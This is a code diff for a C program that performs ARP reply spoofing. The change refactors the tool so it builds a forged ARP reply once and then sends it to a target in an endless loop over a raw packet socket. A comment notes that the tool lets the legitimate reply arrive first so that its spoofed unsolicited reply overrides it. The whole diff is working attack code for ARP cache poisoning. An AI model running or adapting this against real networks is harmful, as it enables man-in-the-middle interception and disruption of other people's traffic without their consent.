@@ -113,7 +113,7 @@ interface_error:
 
 /* #################################################################### */
 
-void	craft_arp_reply(t_ArpPacket *request, t_ArpPacket *reply) {
+void	craft_arp_reply(t_ArpPacket *reply) {
 	// Layer 2 (Ethernet)
 	memcpy(reply->dest, args.tar_mac, ETHER_ADDR_LEN);
 	memcpy(reply->sender, args.src_mac, ETHER_ADDR_LEN);
@@ -133,19 +133,17 @@ void	craft_arp_reply(t_ArpPacket *request, t_ArpPacket *reply) {
 	memcpy(reply->tpa, args.tar_ip, reply->pln);
 }
 
-int	handle_request(char *buff, int packet_socket, int interface_index, struct sockaddr_ll *addr) {
+int	handle_request(char *buff, int packet_socket, struct sockaddr_ll *addr, t_ArpPacket *reply) {
 
-	t_ArpPacket			request, reply;
+	t_ArpPacket			request;
 
 	bzero(&request, sizeof(request));
-	bzero(&reply, sizeof(reply));
 
 	if (parse_request(buff, &request) != 0) {
 		fprintf(stderr, "Failed to parse ARP request\n");
 		return (1);
 	}
-	show_request_info(&request);
-	// craft_arp_reply(&request, &reply);
+	// show_request_info(&request);
 
 	// Sleep for a short time to let the legitimate ARP reply arive before our spoofed unsolicited reply.
 	// This will only work if the target system accepts unsolicited ARP replies.
@@ -153,7 +151,7 @@ int	handle_request(char *buff, int packet_socket, int interface_index, struct so
 		sleep(2);
 
 	while (1) {
-		if (sendto(packet_socket, &reply, sizeof(reply), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_ll)) < 0) {
+		if (sendto(packet_socket, reply, sizeof(*reply), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_ll)) < 0) {
 			puts( strerror( errno ) );
 			return (1);
 		}
@@ -175,6 +173,7 @@ int	arp_reply_spoof(int interface_index) {
 	uint16_t			opcode;
 	struct	sockaddr_ll	src_addr, target_addr;
 	socklen_t			src_addr_len = sizeof(src_addr);
+	t_ArpPacket			reply;
 
 	// Create a packet socket.
 	packet_socket = socket (AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
@@ -185,8 +184,11 @@ int	arp_reply_spoof(int interface_index) {
 
 	bzero(&src_addr, sizeof(src_addr));
 	bzero(&target_addr, sizeof(target_addr));
+	bzero(&reply, sizeof(reply));
 
 	target_addr = create_sockaddr(interface_index, args.tar_mac, ETHER_ADDR_LEN);
+
+	craft_arp_reply(&reply);
 
 	// Listen for ARP requests and process the first one we receive.
 	while (1) {
@@ -211,7 +213,7 @@ int	arp_reply_spoof(int interface_index) {
 		}
 	}
 
-	if (handle_request(buff, packet_socket, interface_index, &target_addr) != 0) {
+	if (handle_request(buff, packet_socket, &target_addr, &reply) != 0) {
 		fprintf(stderr, "Failed to handle ARP request\n");
 		close(packet_socket);
 		return (-1);
